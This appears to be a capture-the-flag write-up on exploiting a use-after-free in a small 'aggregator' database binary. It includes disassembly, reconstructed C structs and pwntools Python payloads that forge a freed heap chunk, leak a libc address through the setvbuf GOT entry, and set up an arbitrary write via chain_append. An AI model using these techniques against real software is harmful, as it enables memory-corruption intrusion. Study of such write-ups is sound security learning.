UAF on aggregator

Create an item on the heap
Then free that item (memory is freed)
Then create a new item on heap that isn't freed, by doing an invalid command
Then trigger a Use After Free on that overwritten memory by doing an append


```C
    while (ch != NULL) {
        if (ch->size > 0) {
            agg = ch->data[0];
            i = 1;
            break;
        }
        ch = ch->next;
    }
```

with the asm:
```asm
     0x400f87 <db_aggregate_month+101>    mov    rax, qword ptr [rax]
     0x400f8a <db_aggregate_month+104>    mov    qword ptr [rbp - 8], rax
     0x400f8e <db_aggregate_month+108>    mov    qword ptr [rbp - 0x10], 1
     0x400f96 <db_aggregate_month+116>    jmp    0x400fab                      <0x400fab>
     0x400f96 <db_aggregate_month+116>    jmp    0x400fab                      <0x400fab>
     0x400fab <db_aggregate_month+137>    jmp    0x400fff                      <0x400fff>
     0x400fff <db_aggregate_month+221>    cmp    qword ptr [rbp - 0x18], 0
```
where `[rbp - 0x18]` is the heap memory location of the invalid command we entered.

Keep stepping through:
```asm
     0x400fdd <db_aggregate_month+187>    mov    rax, qword ptr [rbp - 0x18]
     0x400fe1 <db_aggregate_month+191>    mov    rax, qword ptr [rax + 0x18]
     0x400fe5 <db_aggregate_month+195>    cmp    rax, qword ptr [rbp - 0x10]
     0x400fe9 <db_aggregate_month+199>    ja     db_aggregate_month+141        <0x400faf>
```
Here the pointer value to our invalid command is loaded into rax, and the offset by 0x18 to load back into RAX
If this value at that location is above 1, then jump.

So the C code is expecting this struct at this location:
```C
struct data_table_chain {
    data_t *data;
    day_t day;
    size_t capacity;
    size_t size;
    dbchain *next;
};
```

This is great, because it'll give us an arbitrary read primitive!

Modify our payload to try that:
```python
  payload  = ''
  payload += p64(0x601f58) # GOT address of setvbuf
  payload += p64(0x000000) 
  payload += p64(0x0000FF) # ch->capacity
  payload += p64(0x000001) # ch->size
  payload += p64(0x000000) # ch->next... just null is fine...
    
  r.sendline(payload)
```
So we set the data pointer we want to read to an address in the GOT that points to libc.
Then we read back the "aggregated" value. Which is just the address as an integer.

```python
  r.recvline()
  leak = r.recvline(keepends=False)
  libc.base = int(leak) - libc.symbols['setvbuf']
  print "Libc base = %x" %(libc.base)
```
Score... We're making progress.

Now how do we find an arbitrary write primitive...
Lets see about doing the same trick with an update to an existing item?
Start simple and see if we can get a crash
```python
  #Add date with easily findable item number 
  add_date_mdy(r, date, 0x4141414142424242)
  remove_date_mdy(r, date)

  #Overwrite the area that is now freed, with an invalid command
  payload  = ''
  payload += p64(0x601f58) # GOT address of ...
  payload += p64(0xAAAAAA)
  payload += p64(0xBBBBBB)
  payload += p64(0xCCCCCC) 
  payload += p64(0xDDDDDD) 
  r.sendline(payload)

  add_date_mdy(r, date, 0x4141414142424242)
```
Great. This gets a segfault at `chain_get+47`. it uses the 0xDDDDDD+0x8 as a pointer. This makes sense, we saw that was the next pointer. So lets zero that one.
Lets also set that location as a breakpoint:
```python
  if args.dbg:
    gdb.attach(r, """
    vmmap
    b *chain_get+47
    """)
```

Now we look to see what's happening around the db_add() calling chain_get()
```C
void db_add(db_t D, struct tm* when, data_t data_value) {
    ymon_t ymon = make_ymon(when->tm_year, when->tm_mon);
    day_t day = when->tm_mday;
    dbchain *ch = chain_get(D, ymon, day);
    if (ch == NULL) {
        ch = chain_add(D, ymon, day);
    }
    chain_append(ch, data_value);
}
```
`chain_add()` is a complicated function with lots of stuff in it. `chain_append()` seems more manageable

```C
void chain_append(dbchain *ch, data_t data_value) {
    if (ch->size == ch->capacity) {
        ch->capacity = ch->capacity * 2;
        ch->data = xrealloc(ch->data, ch->capacity * sizeof(data_t));
    }
    ch->data[ch->size] = data_value;
    ch->size++;
}
```

Nice... So we just need a valid pointer for chain_get() to return a pointer to our structure. mmmm
```C
dbchain *chain_get(db_t D, ymon_t y, day_t day) {
    dbchain *ch = chain_head(D, y);
    while (ch != NULL) {
        if (ch->day == day) {
            return ch;
        }
        ch = ch->next;
    }
    return NULL;
}
```
We should get one if we overwrote the head entry. So that should be sorted out then.
Since we saw that `ch->data[ch->size] = data_value;` we need to make sure to subtract the location we want to write to with 8.










